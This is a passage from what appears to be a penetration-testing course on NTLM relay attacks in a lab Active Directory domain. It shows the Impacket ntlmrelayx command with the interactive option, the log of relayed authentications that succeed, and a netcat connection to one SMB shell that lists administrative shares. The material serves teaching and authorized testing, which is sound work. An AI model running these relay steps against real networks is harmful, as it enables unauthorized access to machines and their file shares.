Alternatively, we can use the `--interactive`/ `-i` option to launch an SMB client shell for each `ntlmrelayx` established authenticated session. The SMB client shell will listen locally on a TCP port, and we can reach it with tools such as `nc`:

```
ntlmrelayx.py -tf relayTargets.txt -smb2support -i

Impacket v0.11.0 - Copyright 2023 Fortra

<SNIP>
[*] Servers started, waiting for connections
[*] SMBD-Thread-5: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/RMONTY SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[*] SMBD-Thread-5: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/RMONTY SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11001
[*] SMBD-Thread-8: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/NPORTS SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11002
[*] SMBD-Thread-8: Connection from INLANEFREIGHT/[email protected] controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/NPORTS SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11003
<SNIP>
```

`ntlmrelayx` started interactive SMB client shells for each authenticated session on the relay targets; Each connection will open a port to the target machine. We need to search for these lines in the above output: `[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/RMONTY SUCCEED` followed by `[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000`. If we want to use `RMONTY`’s session to `172.16.117.50`, we need to connect to port `11000` on 127.0.0.1 using `netcat`:

```
nc -nv 127.0.0.1 11000

Connection to 127.0.0.1 11000 port [tcp/*] succeeded!
Type help for list of commands
# shares

ADMIN$
C$
Finance
IPC$
```